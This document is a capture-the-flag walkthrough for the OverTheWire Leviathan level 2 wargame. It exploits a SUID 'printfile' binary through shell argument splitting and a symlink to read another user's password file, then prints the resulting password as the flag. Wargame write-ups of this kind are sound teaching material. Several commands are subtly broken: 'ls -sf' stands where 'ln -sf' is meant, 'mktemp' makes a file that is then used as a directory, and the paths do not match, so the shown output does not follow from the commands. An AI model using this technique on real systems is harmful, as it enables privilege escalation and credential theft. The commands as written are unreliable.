# OverTheWire - Leviathan2

* **Platform:** OverTheWire  
* **Game:** Leviathan  
* **Level:** 2 → 3  

---
[&larr; Previous Level](../leviathan1/README.md)
---

### Login

```bash
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

### Enumeration

After logging in, I checked the home directory:

```bash
leviathan2@leviathan:~$ ls -lA
-rw-r--r--   1 root       root         220 Feb 13  2026 .bash_logout
-rw-r--r--   1 root       root        3851 Jun 24 14:50 .bashrc
-rw-r--r--   1 root       root         807 Feb 13  2026 .profile
-r-sr-x---   1 leviathan3 leviathan2 15068 Jun 24 15:00 printfile
```
There was a binary `printfile` with SUID bit set and owned by leviathan3.

### Analysis

First, I inspect its execution by `ltrace`:
```bash
leviathan2@leviathan:~$ ltrace ./printfile .bash_logout 
__libc_start_main(["./printfile", ".bash_logout"] <unfinished ...>
access(".bash_logout", 4)                                          = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout") = 21
geteuid()                                                          = 12002
geteuid()                                                          = 12002
setreuid(12002, 12002)                                             = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.
```
This SUID binary check read permission of file by `access(".bash_logout", 4)` then runs `cat` command.   
We know that Linux have `Argument Splitting` mechanism. When we pass `test file.txt` it consider two different file `test` and `file.txt`.  
After looking `system("/bin/cat .bash_logout"` this code, we gonna say that it works here. 

### Exploitation
Now, Create a temp directory in /tmp.
```bash
leviathan2@leviathan:~$ mktemp
/tmp/tmp.mIqrtdmv4s
leviathan2@leviathan:~$ echo 'Hello' > /tmp/tmp.mIqrtdmv4s/"test file.txt"
leviathan2@leviathan:~$ ls -sf /etc/leviathan_pass/leviathan3 /tmp/tmp.mIqrtdmv4s/test

leviathan2@leviathan:~$ ./printfile /tmp/temp/"test file.txt"
PiEpxxknZH
cat: file.txt: No such file or directory
```
Here, It works and we got the password for next level.

### Flag
`PiEpxxknZH`

---
[Next Level &rarr;](../leviathan3/README.md) 
---